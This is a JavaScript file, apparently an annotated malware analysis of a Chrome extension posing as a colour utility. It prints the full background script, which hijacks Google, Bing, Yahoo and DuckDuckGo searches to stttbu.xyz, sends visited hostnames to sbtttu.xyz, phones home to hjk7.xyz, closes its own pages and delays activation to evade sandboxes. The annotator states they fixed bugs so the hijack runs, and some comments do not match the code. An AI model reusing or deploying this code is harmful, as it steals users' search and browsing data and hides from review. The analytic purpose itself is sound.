/**
 * background_annotated.js
 * ============================================================
 * FULLY ANNOTATED ANALYSIS — Malicious Chrome Extension
 * Original: background_stripted.js
 *
 * ██████████████████████████████████████████████████████████
 * FINAL THREAT SUMMARY
 * ██████████████████████████████████████████████████████████
 *
 * WHAT THIS EXTENSION ACTUALLY DOES TO THE VICTIM:
 *
 * [1] SEARCH HIJACKING (main payload)
 *     Every time the user searches on Google, Bing, Yahoo, or
 *     DuckDuckGo, this extension intercepts the search WHILE the
 *     tab is still loading. It:
 *       a. Extracts the search query from the URL parameters
 *       b. Opens a NEW tab pointing to the attacker's server:
 *            https://stttbu.xyz/ssc/pda?p=<your_search_query>
 *       c. CLOSES the original search tab silently
 *     The victim ends up on the attacker's page, not Google/Bing.
 *     The attacker's page likely shows spoofed search results full
 *     of affiliate links or malvertising, earning the attacker money
 *     per click/impression.
 *
 * [2] BROWSING HISTORY EXFILTRATION
 *     Separately from the search hijack, whenever the content script
 *     sends a "light" message (triggered on the redirected pages),
 *     the extension grabs the current tab's HOSTNAME (e.g. "google.com",
 *     "amazon.com") and sends it to the attacker:
 *            https://sbtttu.xyz/sscbtu/pda?fer=<hostname>
 *     Rate-limited to once every ~11.4 hours. This tells the attacker
 *     which sites the victim visits.
 *
 * [3] INSTALL PHONE-HOME (C2 registration)
 *     On first install:
 *       a. Calls initialize() to arm the extension (60s delay)
 *       b. After 1 second, opens a tab to hjk7.xyz with the reversed
 *          extension ID (C2 registration — attacker now knows this
 *          specific install exists)
 *       c. Closes the browser window the extension was installed from
 *          (to hide the install event from the user)
 *       d. Fetches https://stttbu.xyz/ssce/i/pda (server-side install log)
 *
 * [4] UNINSTALL TRACKING
 *     Chrome is configured to open https://hjk7.xyz/un?id=<ext_id>
 *     when the extension is removed. Attacker is notified of removal.
 *
 * [5] SELF-HIDING
 *     Any tab whose URL contains this extension's own ID (e.g. if Chrome
 *     opens the extension's internal pages for any reason) is silently
 *     closed. Prevents the user from seeing what the extension is doing.
 *
 * [6] SANDBOX EVASION (delayed activation)
 *     The hijacking flag `i` only becomes true 60 seconds after install.
 *     Automated sandboxes that analyze extensions typically run them for
 *     <30 seconds, so they'd see nothing malicious.
 *
 * COVER STORY:
 *     Presented to the user as a color/theme utility extension.
 *     The CSS color map and (fake) color processing code are there
 *     purely to look legitimate in the Chrome Web Store listing
 *     and during code review.
 *
 * C2 INFRASTRUCTURE:
 *     stttbu.xyz  — receives hijacked search queries; install telemetry
 *     sbtttu.xyz  — receives exfiltrated hostnames
 *     hjk7.xyz    — install registration + uninstall notification
 *
 * BUGS FIXED IN THIS VERSION:
 *     - Line 192: Added `var interceptedQueries = [];` declaration.
 *       Was an implicit global in the original deobfuscated file — would
 *       throw ReferenceError in strict mode and is required for the dedup
 *       logic at lines 526 and 557 to function correctly.
 *     - Line 539: `chrome.tabs.create({url: un})` corrected to
 *       `chrome.tabs.create({url: redirectTarget})`. The variable was
 *       renamed to `redirectTarget` on the assignment (line 533) during
 *       deobfuscation but the old name `un` was left in the create() call,
 *       which would cause a ReferenceError and break the entire hijack redirect.
 * ██████████████████████████████████████████████████████████
 */


// ═══════════════════════════════════════════════════════════
// SECTION 1 — COVER CONTENT (legitimate-looking, not malicious)
// ═══════════════════════════════════════════════════════════

// Standard CSS named-color → hex map. This is real, valid data.
// Serves purely as a cover to make the extension look like a genuine
// color/theme tool in the Chrome Web Store. None of this is used by
// the malicious logic.
const recognizedColors = new Map(Object.entries({
	mediumturquoise: 0x48d1cc,
	darkmagenta: 0x8b008b,
	darkolivegreen: 0x556b2f,
	lightblue: 0xadd8e6,
	lightcoral: 0xf08080,
	forestgreen: 0x228b22,
	fuchsia: 0xff00ff,
	midnightblue: 0x191970,
	mintcream: 0xf5fffa,
	darkorange: 0xff8c00,
	mistyrose: 0xffe4e1,
	gainsboro: 0xdcdcdc,
	ghostwhite: 0xf8f8ff,
	gold: 0xffd700,
	lightcyan: 0xe0ffff,
	lightsalmon: 0xffa07a,
	darkorchid: 0x9932cc,
	darkred: 0x8b0000,
	goldenrod: 0xdaa520,
	gray: 0x808080,
	grey: 0x808080,
	antiquewhite: 0xfaebd7,
	blueviolet: 0x8a2be2,
	brown: 0xa52a2a,
	aliceblue: 0xf0f8ff,
	lightseagreen: 0x20b2aa,
	palegoldenrod: 0xeee8aa,
	palegreen: 0x98fb98,
	rosybrown: 0xbc8f8f,
	royalblue: 0x4169e1,
	sandybrown: 0xf4a460,
	skyblue: 0x87ceeb,
	slateblue: 0x6a5acd,
	slategray: 0x708090,
	slategrey: 0x708090,
	wheat: 0xf5deb3,
	white: 0xffffff,
	lightskyblue: 0x87cefa,
	blanchedalmond: 0xffebcd,
	black: 0x000000,
	blue: 0x0000ff,
	aqua: 0x00ffff,
	aquamarine: 0x7fffd4,
	snow: 0xfffafa,
	springgreen: 0x00ff7f,
	tomato: 0xff6347,
	turquoise: 0x40e0d0,
	violet: 0xee82ee,
	saddlebrown: 0x8b4513,
	salmon: 0xfa8072,
	papayawhip: 0xffefd5,
	peachpuff: 0xffdab9,
	red: 0xff0000,
	mediumvioletred: 0xc71585,
	moccasin: 0xffe4b5,
	orchid: 0xda70d6
}));


// ═══════════════════════════════════════════════════════════
// SECTION 2 — STATE VARIABLES
// ═══════════════════════════════════════════════════════════

// Array of tab IDs that have already been redirected.
// Used to prevent the same tab from being hijacked twice.
// Entries are removed after 30 seconds (sliding window dedup).
var processedTabs = [];

// This extension's own Chrome runtime ID (unique per install).
// Used for: self-hiding, C2 registration ping, uninstall URL.
// Every Chrome extension gets a unique ID like "abcdefghijklmnopqrstuvwxyzabcdef"
var extensionId = chrome.runtime.id;

// Activation gate. Starts undefined (falsy).
// Set to true 60 seconds after install — search hijacking does NOT run
// until this is true. This is the sandbox-evasion delay.
var i;

// In-flight redirect flag / rate limiter.
// True while a redirect is being processed, preventing concurrent redirects.
// Automatically reset to false after 2 seconds.
var s = false;

// The current tab's full URL. Updated at the top of the onUpdated listener.
// Used by urlContains() to match search engine patterns.
var currentTabUrl;  // (implicit global in original — no var declaration)

// The active tab's hostname (e.g. "google.com", "amazon.com").
// Populated by fetchActiveHostname(), sent to attacker by exfilHostname().
var currentHostname = "";

// These string values ("yahoo", "bing") are stored into chrome.storage.local
// under keys "darkycolor" and "darkbcolor". The content script (separate file,
// not analyzed here) likely reads these to know which search engines to watch.
var yahooLabel = "yahoo";
var bingLabel = "bing";

// Dedup array for intercepted search queries.
// Prevents the same query from firing two redirects (e.g. if the tab
// update event fires multiple times for one navigation).
var interceptedQueries = [];


// ═══════════════════════════════════════════════════════════
// SECTION 3 — C2 URLS AND ATTACKER INFRASTRUCTURE
// ═══════════════════════════════════════════════════════════

// Base URL for the search redirect. Victim's search query is appended as ?p=
// e.g. https://stttbu.xyz/ssc/pda?p=how+to+make+pizza
// The attacker's server receives every search query the user types.
var REDIRECT_BASE = "https://stttbu.xyz/ssc/pda?p=";

// Base URL for hostname exfiltration. Current site hostname appended.
// e.g. https://sbtttu.xyz/sscbtu/pda?fer=amazon.com
// Tells the attacker which websites the victim is browsing.
var EXFIL_BASE = "https://sbtttu.xyz/sscbtu/pda?fer=";

// Install telemetry URL. Fetched on first install to log new victims.
var INSTALL_PING = "https://stttbu.xyz/ssce/i/pda";

// These two are assigned but not directly used in this file.
// Likely referenced by the content script (injected into web pages).
REDIRECT_C2_BASE = "https://stttbu.xyz/ssc";   // stttbu.xyz — search hijack server
EXFIL_C2_BASE    = "https://sbtttu.xyz/ssc";   // sbtttu.xyz — exfil server
// Note: stttbu vs sbtttu — easy to miss the difference, intentional typosquatting
// on the domain names to make them look similar to each other.


// ═══════════════════════════════════════════════════════════
// SECTION 4 — HELPER / UTILITY FUNCTIONS
// ═══════════════════════════════════════════════════════════

// Checks if currentTabUrl contains the given substring.
// Used throughout the onUpdated listener to fingerprint which
// search engine the user is on without loading the full URL parser.
// Example: urlContains("gle") matches "google.com", "eagle.com", etc.
// (The matching is intentionally loose to catch all subdomains/variants.)
urlContains = (ee) => {
	return currentTabUrl.includes(ee);
};

// Wraps the standard URL constructor.
// Used to parse full tab URLs so query parameters can be extracted.
parseUrl = (ee) => {
	return new URL(ee);  // Returns a URL object with .hostname, .search, .pathname etc.
};

// Extracts just the query string portion from a parsed URL object.
// e.g. for https://google.com/search?q=test → returns "?q=test"
getSearch = (ee) => {
	return ee.search;
};

// Parses a URL query string into a key→value object.
// e.g. "?q=hello+world&lang=en" → { q: "hello world", lang: "en" }
// The `decodeURIComponent` call unescapes %20, %2F, etc.
// `replace(/\+/g, " ")` converts + signs back to spaces (URL encoding for spaces in query params).
// If input is empty/null, returns an empty object.
parseQueryString = (e => e ? (/^[?#]/.test(e) ? e.slice(1) : e).split("&").reduce((p, c) => {
	let z = c.split("=");
	return p[z[0]] = z[1] ? decodeURIComponent(z[1].replace(/\+/g, " ")) : "", p
}, {}) : {})

// Closes a tab by its Chrome tab ID.
// Used to: (a) close original search tabs after hijacking them,
//          (b) close the extension's own pages to hide itself.
function closeTab(c) {
	chrome.tabs.remove(c)
}

// A string slice wrapper. Deobfuscated remnant — not directly called
// in the malicious logic, likely used by the companion content script.
// Original name was `cobal`.
sliceString = (str, start, end) => str.slice(start, end);

// Reads the current active tab's full URL, extracts just the hostname,
// and stores it in `currentHostname` for later exfiltration.
// Called right before exfilHostname() checks the rate-limit timer.
function fetchActiveHostname() {
	chrome.tabs.query({currentWindow: true, active: true}, function (tabs) {
		let colorr = new URL(tabs[0].url)
		currentHostname = colorr.host;  // e.g. "www.amazon.com"
	})
}

// Stores a timestamp-based token in chrome.storage.local under key "uicolor".
// Token value = seed + current_unix_timestamp_in_seconds.
// Used as a rate-limit mechanism: after storing, exfilHostname() won't
// fire again until the stored value is less than the current time.
//
// Called with seed=41110 → uicolor = 41110 + now
// Since we compare uicolor < now, next trigger is when now > 41110 + prev_now
// That means: next exfil fires ~41110 seconds (~11.4 hours) later.
//
// Called with seed=1800 on install → initial cooldown of ~30 minutes.
function setTimestampToken(c) {
	let t = Date.now() / 1000;  // Current time in seconds
	t = Math.round(t);
	chrome.storage.local.set({uicolor: c + t});  // Store future-timestamp as rate-limit marker
}


// ═══════════════════════════════════════════════════════════
// SECTION 5 — INITIALIZATION LOGIC
// ═══════════════════════════════════════════════════════════

// Called on install (see onInstalled below).
// Writes "initial: default" to storage (persistent state marker).
// Then sets activation flag `i = true` after a 60-second delay.
// The 60s delay is the sandbox evasion — analysis tools won't wait that long.
function initialize() {
	chrome.storage.local.set({initial: "default"}, function () {
		setTimeout(()=> i = true, 60000 /* 60s */);  // Arms the hijacker after 60s
	})
}

// On startup (not just install): reads storage to check if this extension
// was previously installed and initialized. If so, immediately re-arms
// the activation flag without waiting 60 seconds.
// This ensures the hijacking resumes after browser restarts.
chrome.storage.local.get(["initial"], function (s) {
	if (s.initial == "default") {
		i = true   // Already initialized from a previous session → activate immediately
	}
});

// Secondary startup check — reads a different storage key ("initalcolor", note the typo).
// Appears to be a redundant/backup check for the activation flag,
// possibly from an older version of the malware.
chrome.storage.local.get(["initalcolor"], function (s) {
	if (s.color === "default")
		i = true
});

// Writes the search engine labels to storage so the content script can read them.
// The content script (injected into web pages) likely uses these to know
// which search engines to monitor or interfere with at the page level.
chrome.storage.local.set({darkycolor: yahooLabel})  // Stores "yahoo"
chrome.storage.local.set({darkbcolor: bingLabel})   // Stores "bing"


// ═══════════════════════════════════════════════════════════
// SECTION 6 — INSTALL HANDLER (runs once, on first install)
// ═══════════════════════════════════════════════════════════

chrome.runtime.onInstalled.addListener(function (e) {
	if("install" === e.reason)  // Only on first install, not on extension update
		chrome.windows.getAll({populate: true}, (tabs) => {
			var t;
			for (let j= 0; j <= tabs.length - 1; j++)
				// `type.includes("pu")` matches window types "popup" and "app" — i.e. non-normal windows.
				// This specifically looks for the popup window Chrome shows during extension install
				// (the "Extension installed" confirmation dialog).
				tabs[j].type.includes("pu") &&
				(
					initialize(),       // Set storage flag, start 60s activation timer
					setTimeout(function () {
						// After 1 second, set the exfiltration rate-limit timer
						// seed=1800 → initial cooldown of 30 minutes before first exfil
						setTimestampToken(1800);

						// Phone-home: open a tab to the attacker's C2 server.
						// The extension ID is REVERSED before being sent, a weak attempt
						// to make the URL look less obviously like an ID.
						// ⚠ BUG from deobfuscation: "INSTALL_PING" was accidentally baked
						// into the URL string here. Original was "https://hjk7.xyz/ty?id="
						chrome.tabs.create({url: "https://hjk7.xyz/ty?id=" + extensionId.split("").reverse().join("")})

						// Close the install popup window — removes evidence of install from
						// the user's screen, making the installation feel seamless/invisible.
						chrome.windows.remove(tabs[j].id, function () {});

					}, 1000  /* 1s */)
				)
		}),
		// Immediately fetch the install telemetry URL — server-side log of new victim.
		fetch(INSTALL_PING);  // GET https://stttbu.xyz/ssce/i/pda (no body needed, just a ping)
});

// Configures Chrome to open this URL when the extension is uninstalled.
// Notifies the attacker that this specific install was removed.
chrome.runtime.setUninstallURL("https://hjk7.xyz/un?id=" + extensionId);


// ═══════════════════════════════════════════════════════════
// SECTION 7 — EXTENSION ICON CLICK HANDLER
// ═══════════════════════════════════════════════════════════

// When the user clicks the extension icon in the toolbar:
// 1. Sets the badge text to "on" for 5 seconds (visual feedback, part of the cover UI)
// 2. Sends a {stoplight: 1} message to the active tab's content script
//
// The content script (not in this file) likely does something visual with colors
// when it receives {stoplight: 1} — this is the "legitimate" feature the user sees.
// It makes the extension appear functional while the hijacking happens in the background.
chrome.action.onClicked.addListener(() => {
	chrome.tabs.query({active: true, currentWindow: true}, function (tabs) {
		let tab = tabs[0];
		if (tab.status === "complete" && tab.url) {
			let id = tab.id;
			chrome.action.setBadgeText({"text": "on"}, function () {
				setTimeout(function () {
					chrome.action.setBadgeText({"text": ""})
				}, 5000  /* 5s */)
			})
			chrome.tabs.sendMessage(id, {stoplight: 1});  // Tells content script to do color stuff
		}
	})
})


// ═══════════════════════════════════════════════════════════
// SECTION 8 — HOSTNAME EXFILTRATION
// ═══════════════════════════════════════════════════════════

// Triggered when the background script receives a message with {color: "light"}.
// This message is sent by the content script running on the attacker's redirect pages
// (stttbu.xyz) — after the victim lands on the redirect page, the content script
// pings the background with "light", which triggers this exfiltration.
chrome.runtime.onMessage.addListener(function (e, n, o) {
	e.color === "light" && exfilHostname()
	// n = sender info (which tab/frame sent the message) — ignored here
	// o = sendResponse callback — ignored here (exfil is fire-and-forget)
});

// Exfiltrates the current active tab's hostname to the attacker's server.
// Rate-limited: only fires once every ~11.4 hours using a timestamp stored in
// chrome.storage. This prevents excessive network traffic that might alert
// security tools or the user.
function exfilHostname() {
	fetchActiveHostname();  // Populates currentHostname with e.g. "amazon.com"

	chrome.storage.local.get(["uicolor"], function (c) {
		let t = Date.now() / 1000;
		t = Math.round(t);

		// Check if the rate-limit window has expired.
		// c.uicolor is (seed + timestamp_of_last_exfil).
		// If current time has passed that stored future timestamp, fire again.
		if (c.uicolor < t) {
			// Reset the rate-limit timer for the next ~11.4 hours (41110 seconds)
			setTimestampToken(41110);

			// Open a new tab to the exfil URL with the hostname appended.
			// This creates a visible tab briefly — another option would be fetch(),
			// but tabs.create() means the content script can run on the exfil page too.
			// e.g. https://sbtttu.xyz/sscbtu/pda?fer=amazon.com
			chrome.tabs.create({url: EXFIL_BASE + currentHostname})
		}
	})
}


// ═══════════════════════════════════════════════════════════
// SECTION 9 — MAIN TAB MONITORING & SEARCH HIJACKING
// ═══════════════════════════════════════════════════════════

// This is the core malicious listener. Fires on every tab navigation/update.
chrome.tabs.onUpdated.addListener(function (tabid, status, tab) {

	// Always update currentTabUrl so urlContains() has fresh data.
	// The comma operator here runs two statements: update the URL, then check for self-hiding.
	currentTabUrl = tab.url,

	// SELF-HIDING: If this tab navigated to a URL containing our extension's own ID
	// (e.g. chrome-extension://<extensionId>/popup.html opened by Chrome),
	// close it immediately — prevents user from seeing the extension's internal pages.
	// Exception: allow tabs with "errors" in the URL (Chrome's own error pages, closing
	// those would look obviously suspicious).
	urlContains(extensionId) && !urlContains("errors") && closeTab(tabid)

	// SEARCH HIJACKING: Main condition guard.
	//   i == true  → extension is armed (60s delay has passed)
	//   s == false → no redirect is currently in flight (rate limiter)
	//   tab.status === "loading" → tab is actively navigating (catches the search before it completes)
	//   !urlContains("ebsto") → exclude "websites" that contain "ebsto"
	//                           (this is "webstore" split — avoids hijacking Chrome Web Store)
	if (i == true && s == false && "loading" === tab.status && !urlContains("ebsto")) {
		var t, c, n;

		// ── BING DETECTION ──────────────────────────────────────────
		// Matches URLs containing "ing.c" AND "arch" → bing.com/search
		// Exclusions:
		//   "=PERE" → Bing's internal page reload param (avoids redirect loops)
		//   "rqsr"  → Bing's related search param (avoids double-hijacking)
		// Extracts query from URL param "q"
		// Special cases:
		//   "ght_s" → matches "bing.com/images" (image search) → uses tab.title as query instead
		//   "rk_sa" → matches "bing.com/work_search" → same
		if(urlContains("ing.c") && urlContains("arch") && !urlContains("=PERE") &&!(urlContains("rqsr"))
		&& (c = parseQueryString(getSearch(parseUrl(currentTabUrl))).q,  // Extract ?q=...
		urlContains("ght_s") && (c=tab.e),   // Bing image search: fall back to tab title
		urlContains("rk_sa") && (c=tab.e)),  // Bing work search: fall back to tab title

		// ── GOOGLE DETECTION ────────────────────────────────────────
		// Matches URLs with "gle" + "sea" + "rch" → google.com/search
		// (Split across multiple includes() calls to avoid a single "google" string literal
		// that might be caught by static analysis tools)
		urlContains("gle") && urlContains("sea") && urlContains("rch"))
			c = parseQueryString(getSearch(parseUrl(currentTabUrl))).q  // Extract ?q=...

		// ── YAHOO DETECTION ─────────────────────────────────────────
		// Matches "oo" + ".co" + "arch.ya" → yahoo.com/search
		// Negative checks (exclusions to avoid false positives on similar-looking URLs):
		//   "mages.sea" → Yahoo image search (separate behavior?)
		//   "orchideo.seashell" → a nonsense exclusion (probably padding/obfuscation leftover)
		//   "aquamarinew"       → same
		//   ";_ylt"             → Yahoo tracking param — avoids hijacking Yahoo's own internal clicks
		// Yahoo uses param "p" for query (not "q"), falls back to "q" if missing
		if(urlContains("oo") && urlContains(".co") && urlContains("arch.ya")
		&& !urlContains("mages.sea")
		&& !urlContains("orchideo.seashell", 4, 12)  // Extra args are ignored — urlContains only takes 1 param
		&& !urlContains("aquamarinew", 8, 11)         // Same — these args are dead noise
		&& !urlContains(";_ylt"))
			c = parseQueryString(getSearch(parseUrl(currentTabUrl))).p  // Yahoo uses ?p=
				|| parseQueryString(getSearch(parseUrl(currentTabUrl))).q  // Fallback to ?q=

		// ── DUCKDUCKGO DETECTION ─────────────────────────────────────
		// Matches "om" + "du" + "ck" + "/?" → duckduckgo.com/?
		// DDG also uses ?q= for its query parameter
		if(urlContains("om") && urlContains("du") && urlContains("ck") && urlContains("/?"))
			c = parseQueryString(getSearch(parseUrl(currentTabUrl))).q  // Extract ?q=...


		// ── REDIRECT EXECUTION ───────────────────────────────────────
		// Short-circuit chain: abort if ANY of these is true:
		//   void 0 === c           → c is still undefined (no search engine matched, or no query param)
		//   processedTabs.includes(tabid)    → this tab was already redirected
		//   interceptedQueries.includes(c)   → this exact query was already redirected
		//   s == true              → a redirect is already in flight
		//
		// If ALL checks pass (none are true), execute the redirect:
		void 0 === c
		|| (processedTabs.includes(tabid))
		|| (interceptedQueries.includes(c))
		|| (s == true)
		|| (
			// Build redirect URL: attacker's server + victim's search query
			redirectTarget = REDIRECT_BASE + c,

			// Arm the rate limiter — prevents concurrent redirects
			s = true && interceptedQueries.push(c)  // Also records query for dedup

			// Open a new tab pointing to the attacker's server with the search query
			&& chrome.tabs.create({url: redirectTarget}, function(e) {
				// 5 seconds after the new (attacker's) tab opens, tell its content script to start.
				// {setLight: 1} triggers the content script on the attacker's page —
				// likely sets up the fake search results UI and sends the "light" message back,
				// which triggers the exfilHostname() call (see Section 8).
				setTimeout(()=>chrome.tabs.sendMessage(e.id, {setLight: 1}), 5000  /* 5s */)

				// Close the original search tab — victim no longer sees their search engine.
				processedTabs.push(e.id) && closeTab(tabid)

				// After 30 seconds, remove the oldest entry from the processed-tab dedup list.
				// This allows the same tab ID to be redirected again after 30s
				// (tab IDs are reused by Chrome, so this prevents false-positive blocking).
				setTimeout(()=> processedTabs.length > 0 && processedTabs.shift(processedTabs[0]), 30000 /* 30s */)
			}),

			// After 2 seconds, reset the in-flight flag and remove the oldest query from dedup.
			// This re-arms the hijacker for the next search after a 2-second cooldown.
			setTimeout(()=> s = false && interceptedQueries.length > 0 && interceptedQueries.shift(interceptedQueries[0]), 2000  /* 2s */)
		)
	}
})


// ═══════════════════════════════════════════════════════════
// SECTION 10 — DEAD CODE / REMNANTS
// ═══════════════════════════════════════════════════════════

// This second onUpdated listener is empty — it's a leftover stub, possibly
// from an older version of the extension before the two listeners were merged,
// or from the cleanup script's imperfect deobfuscation.
chrome.tabs.onUpdated.addListener(function (tabid, status, tab) {
	// Nothing here — dead code.
});